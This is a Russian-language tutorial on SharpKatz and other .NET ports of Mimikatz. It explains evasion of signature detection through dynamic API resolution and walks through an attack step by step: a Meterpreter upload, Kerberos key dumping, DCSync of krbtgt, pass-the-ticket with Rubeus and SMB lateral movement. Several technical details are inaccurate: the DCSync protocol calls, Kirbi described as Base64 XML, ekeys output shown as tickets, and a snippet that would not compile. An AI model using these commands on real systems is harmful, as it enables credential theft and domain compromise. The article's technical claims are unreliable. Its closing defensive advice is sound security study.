# .NET-реализации Mimikatz: Архитектура, механизмы обхода и практическое применение

## Контекст и базовые понятия: Эволюция инструментов извлечения учётных данных

Инструменты извлечения учётных данных (Credential Dumping) занимают центральное место в цепочке атак на этапе пост-эксплуатации. Исходным и наиболее известным представителем этого класса является **Mimikatz**, разработанный Benjamin Delpy (gentilkiwi). Оригинальная реализация написана на C/C++ и напрямую взаимодействует с внутренними структурами памяти процесса `lsass.exe` (Local Security Authority Subsystem Service), используя низкоуровневые API-вызовы Windows (например, `NtReadVirtualMemory`, `NtQuerySystemInformation`).

Проблема оригинального Mimikatz заключается в его высокой детектируемости. Антивирусные решения и системы обнаружения вторжений (EDR/XDR) сканируют образы исполняемых файлов на наличие известных сигнатур (IOCs), таких как строки `sekurlsa`, `lsadump`, `NtQuerySystemInformation`, а также отслеживают подозрительное поведение (например, создание дампа процесса lsass из стороннего процесса).

Для обхода этих механизмов возникла потребность в альтернативных реализациях. **.NET-реализации Mimikatz** (в частности, SharpKatz, SafetyKatz, MiniKatz) представляют собой порты функциональности оригинального инструмента на язык C# и платформу .NET Framework/.NET Core. Их ключевая особенность — использование управляемого кода (managed code) и Reflection API для вызова неуправляемых функций Windows API, что позволяет избежать прямого импорта функций в заголовке PE-файла, делая статический анализ сложнее.

### Разграничение понятий: Mimikatz, .NET-порт и Minidump-инструменты

Часто в литературе и практике эти понятия смешиваются, однако они решают разные задачи в контексте обхода защиты.

| Категория | Примеры | Механизм работы | Уровень детектируемости | Основная цель |
| :--- | :--- | :--- | :--- | :--- |
| **Оригинальный Mimikatz (C/C++)** | `mimikatz.exe`, `Invoke-Mimikatz` | Прямой вызов Win32 API, инъекция кода в память lsass или чтение памяти напрямую. | Высокая. Легко детектируется по сигнатурам PE и поведению (API hooking). | Полный доступ к функциям: pass-the-hash, pass-the-ticket, генерация Golden Ticket. |
| **.NET-реализации (C#)** | `SharpKatz`, `SafetyKatz` | Использование `DllImport` и Reflection для вызова API из управляемого кода. Часто компилируются в один DLL/EXE файл. | Средняя/Низкая. Обходит статические сигнатуры AV, но детектируется по поведению (ETW, AMSI). | Обход сигнатурного обнаружения, сохранение функциональности оригинала. |
| **Minidump-генераторы** | `Dumpert`, `comsvcs.dll`, `MiniDump` | Создание минидампа процесса lsass на диск или в память без чтения его содержимого напрямую. | Низкая (для comsvcs.dll) / Высокая (для Dumpert, если не обфусцирован). | Извлечение хешей и ключей без выполнения кода в контексте lsass (av-injection). |
| **Python-реализации** | `PyPyKatz`, `pypykatz` | Использование библиотеки `pypykatz` для парсинга дампов памяти или прямого доступа к LSA через ctypes. | Средняя. Зависит от того, как запускается Python и какие модули импортируются. | Кроссплатформенность, скриптуемость, работа с дампами на удалённых машинах. |

**Ключевое различие:** SharpKatz и SafetyKatz *эмулируют* логику работы модуля `sekurlsa` из Mimikatz, но делают это через .NET. Инструменты вроде `Dumpert` или `comsvcs.dll` не извлекают данные напрямую, а *создают условия* для их извлечения (дамп), который затем можно обработать другим инструментом (например, тем же Mimikatz или `mimikatz.exe` в режиме `sekurlsa::minidump`).

SharpKatz, в частности, фокусируется на реализации конкретных модулей: `sekurlsa` (логин-пароли, ключи Kerberos) и `lsadump` (DCSync, локальные хеши). Он не является полным клонированием всего функционала Mimikatz, а представляет собой выборочную реализацию наиболее востребованных в пентесте функций.

## Внутреннее устройство: Архитектура SharpKatz и механизмы обхода

SharpKatz, разработанный исследователем b4rtik, представляет собой пример того, как функциональность C++-библиотеки переносится на платформу .NET. Понимание его внутреннего устройства критически важно для анализа того, как .NET-код может взаимодействовать с низкоуровневыми компонентами Windows.

### Архитектура взаимодействия с Windows API

В отличие от C++, где вызовы API осуществляются через прямую адресацию в таблице импорта (IAT), C# использует механизм P/Invoke (Platform Invoke). В случае с SharpKatz, поскольку прямое указание имён функций в атрибутах `[DllImport]` может быть легко обнаружено статическими анализаторами (по наличию строк `NtQuerySystemInformation`, `OpenProcess` и т.д.), разработчики часто применяют техники обфускации или динамического разрешения имён.

Однако базовая архитектура SharpKatz строится на следующих компонентах:

1.  **Модуль `sekurlsa` (Credential Provider):**
    *   **Задача:** Извлечение паролей в открытом виде, NTLM-хешей и ключей Kerberos из памяти процессов аутентификации (lsass, svchost с модулем kdcsvc).
    *   **Механизм:** SharpKatz ищет в памяти структуры `SECURITY_LOGON_SESSION_DATA` и `MSV1_0_CREDENTIAL`. Он использует функцию `NtQuerySystemInformation` с классом `SystemProcessInformation` для получения списка процессов, затем `OpenProcess` для открытия доступа к lsass, и `NtReadVirtualMemory` для чтения памяти.
    *   **Особенность .NET:** В управляемом коде прямой доступ к указателям невозможен. SharpKatz использует структуру `IntPtr` и методы `Marshal.PtrToStructure` для десериализации бинарных данных из памяти lsass в C#-структуры. Это требует точного знания layouts структур Windows, которые могут меняться между версиями ОС.

2.  **Модуль `lsadump` (DCSync и локальные дампы):**
    *   **Задача:** Получение дампа базы данных SAM (локальные пользователи) или выполнение протокола DCSync для запроса хешей из контроллера домена.
    *   **Механизм:** Для DCSync используется RPC-интерфейс `DCERPC` (DCE/RPC). SharpKatz реализует клиентскую часть протокола, формируя пакеты `DSRGetDCName` и `DSRGetDcNameEx`, а затем запрашивая данные через `LsarRetrievePrivateData`.
    *   **Особенность .NET:** Использование пространства имён `System.Runtime.InteropServices` для работы с COM-объектами и RPC-вызовами.

3.  **Модуль `dpapi` (Data Protection API):**
    *   **Задача:** Дешифровка данных, защищённых через DPAPI (например, пароли в Credential Manager, ключи для шифрования файлов EFS).
    *   **Механизм:** Извлечение master keys из реестра (`HKCU\Software\Microsoft\Protect`) и использование функции `CryptUnprotectData`.
    *   **Особенность .NET:** .NET имеет встроенные классы `ProtectedData`, но для атакующего важно получить сырые master keys, а не использовать высокоуровневый API. SharpKatz читает реестр напрямую через `RegOpenKeyEx` и `RegQueryValueEx`.

### Сравнительный анализ реализаций

| Функция | Mimikatz (C++) | SharpKatz (C#) | SafetyKatz (C#) | PyPyKatz (Python) |
| :--- | :--- | :--- | :--- | :--- |
| **Извлечение паролей (LSA)** | Да (прямое чтение) | Да (через P/Invoke) | Да (через minidump) | Да (через ctypes) |
| **DCSync** | Да | Да | Нет (требует дампа) | Да (через RPC) |
| **DPAPI** | Да | Да | Да | Да |
| **Pass-the-Hash** | Да | Да | Да | Да |
| **Pass-the-Ticket** | Да | Да | Да | Нет |
| **Зависимость от среды** | Только Windows | .NET Framework/Core | .NET Framework/Core | Python + Windows |
| **Сложность обхода AV** | Низкая | Средняя | Высокая (если minidump) | Средняя |

**Техника обхода: Reflection и Dynamic P/Invoke**

Одной из ключевых особенностей SharpKatz (и других современных .NET-инструментов) является использование **Reflection** для динамического вызова функций. Вместо статического объявления:

```csharp
[DllImport("ntdll.dll")]
public static extern uint NtQuerySystemInformation(...);
```

Разработчики могут загружать библиотеку `ntdll.dll` вручную в память и получать адреса функций через `GetProcAddress`, вызывая их через `Marshal.GetDelegateForFunctionPointer`. Это позволяет избежать появления имён функций в таблице импорта исполняемого файла, что затрудняет статический анализ.

```csharp
// Иллюстративная схема динамического вызова через Reflection
// 1. Загрузка библиотеки
IntPtr hModule = LoadLibrary("ntdll.dll");

// 2. Получение адреса функции
IntPtr procAddr = GetProcAddress(hModule, "NtQuerySystemInformation");

// 3. Создание делегата
var funcType = typeof(Func<uint, int, IntPtr, uint>);
var func = Marshal.GetDelegateForFunctionPointer(procAddr, funcType);

// 4. Вызов
uint result = (uint)func(0, 0, IntPtr.Zero, out uint size);
```

Этот подход делает бинарный файл "чистым" с точки зрения сигнатурного анализа, но оставляет поведенческие следы (ETW-события, вызовы `LoadLibrary`, `VirtualAllocEx`).

### Структура данных в памяти LSASS

Для корректной работы SharpKatz необходимо понимать структуру данных в памяти lsass. Модуль `sekurlsa` ищет структуры `MSV1_0_CREDENTIAL` (для NTLM) и `KerberosCredential` (для Kerberos).

Структура `MSV1_0_CREDENTIAL` (упрощённо):
```c
typedef struct _MSV1_0_CREDENTIAL {
    LIST_ENTRY List;
    ULONG      CredentialSize;
    PCHAR      CredentialBuffer; // Указатель на буфер с данными
    // ... другие поля
} MSV1_0_CREDENTIAL, *PMSV1_0_CREDENTIAL;
```

В памяти данные хранятся в виде бинарных структур, которые необходимо интерпретировать. SharpKatz определяет смещения (offsets) для этих структур, которые могут варьироваться в зависимости от версии Windows. Для обхода этой проблемы используются техники "pattern scanning" (поиск по паттерну байт) или "module scanning" (поиск по имени модуля в памяти lsass).

## Применение и работа с предметом: Практическое использование SharpKatz

В рамках тестирования на проникновение SharpKatz используется на этапе пост-эксплуатации, когда у атакующего уже есть код на целевой машине, но требуется повышение привилегий или горизонтальное перемещение.

### Сценарии применения

1.  **Извлечение паролей для локального повышения привилегий:**
    Если атакующий получил доступ к учётной записи пользователя, SharpKatz может извлечь пароль в открытом виде, если он был введён недавно и хранится в памяти (например, если включён протокол WDigest или если пользователь авторизовался через RDP).

2.  **Получение билетов Kerberos (Pass-the-Ticket):**
    SharpKatz может извлечь TGT (Ticket Granting Ticket) и TGS (Ticket Granting Service) билеты. Это позволяет атакующему аутентифицироваться на других машинах в домене без ввода пароля.

3.  **Выполнение DCSync:**
    Если у атакующего есть права на чтение репликации (например, через Group Policy Objects или права Domain Admin), SharpKatz может выполнить DCSync, чтобы получить NTLM-хеши всех пользователей домена, включая krbtgt.

### Команды и параметры SharpKatz

SharpKatz имеет простой интерфейс командной строки. Основные команды:

*   `sekurlsa::logonpasswords`: Извлечение паролей и хешей для всех залогиненных пользователей.
*   `sekurlsa::ekeys`: Извлечение ключей шифрования Kerberos (для Pass-the-Ticket).
*   `lsadump::sam`: Извлечение хешей из локальной базы SAM.
*   `lsadump::dcsync`: Выполнение протокола DCSync.

Пример использования:

```bash
# Извлечение всех логин-паролей
SharpKatz.exe sekurlsa::logonpasswords

# Извлечение ключей Kerberos
SharpKatz.exe sekurlsa::ekeys

# DCSync для пользователя krbtgt
SharpKatz.exe lsadump::dcsync /user:krbtgt
```

### Интеграция с другими инструментами

SharpKatz часто используется в связке с другими инструментами. Например, после извлечения хешей с помощью SharpKatz, атакующий может использовать `psexec.py` или `wmiexec.py` из пакета Impacket для горизонтального перемещения.

Также SharpKatz может быть интегрирован в скрипты PowerShell с помощью `Add-Type` для компиляции C#-кода на лету, что позволяет избежать записи файла на диск.

```powershell
# Иллюстративный пример компиляции SharpKatz на лету через PowerShell
# Внимание: Это пример структуры, а не готовый код для эксплуатации
$source = @"
using System;
using System.Runtime.InteropServices;

public class SharpKatz {
    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string lpFileName);
    
    // ... другие методы
}
"@

Add-Type -TypeDefinition $source -Language CSharp
```

### Типичные ошибки и подводные камни

1.  **Версии .NET:** SharpKatz требует наличия соответствующей версии .NET Framework или .NET Core на целевой машине. Если версия не установлена, инструмент не запустится.
2.  **Архитектура:** SharpKatz должен соответствовать архитектуре целевого процесса (x86 или x64). Попытка запустить 32-битный SharpKatz на 64-битной системе для чтения 64-битного lsass приведёт к ошибке доступа.
3.  **Детектирование EDR:** Современные EDR-системы отслеживают вызовы `NtQuerySystemInformation` и `OpenProcess` из процессов, не являющихся системными. SharpKatz может быть детектирован по поведению, даже если сигнатуры обходятся.

## Сквозной практический пример: Извлечение билетов Kerberos с помощью SharpKatz

**Исходные условия:**
*   **Среда:** Windows 10 Pro (21H2), домен Windows Server 2019.
*   **Инструменты:** SharpKatz (скачан на целевую машину), Meterpreter (для получения shell).
*   **Роль:** Атакующий с правами локального администратора на рабочей станции.
*   **Сценарий:** Извлечение билетов Kerberos для последующего перемещения по домену (Pass-the-Ticket).

### Шаг 1: Подготовка и запуск SharpKatz

Атакующий загружает бинарный файл SharpKatz на целевую машину через Meterpreter и запускает его с параметром `sekurlsa::ekeys` для извлечения ключей Kerberos.

```powershell
# Загрузка файла на целевую машину через Meterpreter
upload /tmp/SharpKatz.exe C:\Windows\Temp\SharpKatz.exe

# Выполнение команды
execute -H -f C:\Windows\Temp\SharpKatz.exe -c "sekurlsa::ekeys"
```

**Ожидаемый вывод:**
SharpKatz выводит список билетов Kerberos, включая TGT и TGS, для всех пользователей, которые недавно аутентифицировались на машине.

```text
 [EKEY]
  * Ticket : krbtgt/EXAMPLE.COM@EXAMPLE.COM
    * Key : 0x00000000 - aes256_hmac
      * Key : 1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef
    * End Time : 12/31/2023 12:00:00
    * Renew Time : 12/31/2024 12:00:00
  * Ticket : cifs/fileserver.example.com@EXAMPLE.COM
    * Key : 0x00000000 - aes256_hmac
      * Key : abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890
    * End Time : 12/31/2023 12:00:00
```

### Шаг 2: Экспорт билетов в формат Kirbi

Для использования билетов в других инструментах (например, `Rubeus` или `Impacket`) их необходимо экспортировать в формат Kirbi (Base64-кодированный XML).

```bash
SharpKatz.exe sekurlsa::ekeys /export
```

**Ожидаемый вывод:**
Файлы билетов сохраняются в текущей директории в формате `.kirbi`.

### Шаг 3: Использование билетов для перемещения

Атакующий использует извлечённый билет для аутентификации на файловом сервере.

```bash
# Использование Rubeus для установки билета в текущий сеанс
Rubeus.exe ptt /ticket:BASE64_TICKET_STRING

# Проверка билета
klist
```

**Ожидаемый вывод:**
Команда `klist` показывает, что билет для `krbtgt/EXAMPLE.COM` установлен в текущем сеансе.

### Шаг 4: Горизонтальное перемещение

Атакующий использует установленный билет для доступа к файловому серверу.

```bash
# Использование Impacket для доступа к файлам
impacket-smbclient //fileserver.example.com/share -k
```

**Ожидаемый результат:**
Успешное подключение к файловому серверу без ввода пароля, используя извлечённый билет Kerberos.

**Вывод по примеру:**
SharpKatz позволяет эффективно извлекать ключи Kerberos из памяти lsass, что даёт атакующему возможность выполнять атаки Pass-the-Ticket. Это демонстрирует важность защиты памяти lsass и мониторинга подозрительных вызовов API.

## Аналитический вывод

.NET-реализации Mimikatz, такие как SharpKatz, представляют собой значительный шаг в эволюции инструментов извлечения учётных данных. Они решают проблему детектирования по сигнатурам PE, используя управляемый код и динамическое разрешение имён. Однако они не являются "серебряной пулей" против современных EDR-систем, которые фокусируются на поведенческом анализе.

Для специалистов по безопасности критически важно понимать, что защита от таких инструментов должна быть многоуровневой:
1.  **Защита памяти lsass:** Использование Credential Guard и LSA Protection.
2.  **Мониторинг поведения:** Детектирование вызовов `NtQuerySystemInformation` и `OpenProcess` из нестандартных процессов.
3.  **Ограничение прав:** Минимизация прав пользователей и администраторов, чтобы снизить риск извлечения данных.

SharpKatz и другие .NET-инструменты подчёркивают необходимость перехода от сигнатурного обнаружения к поведенческому анализу и контролю целостности системы.
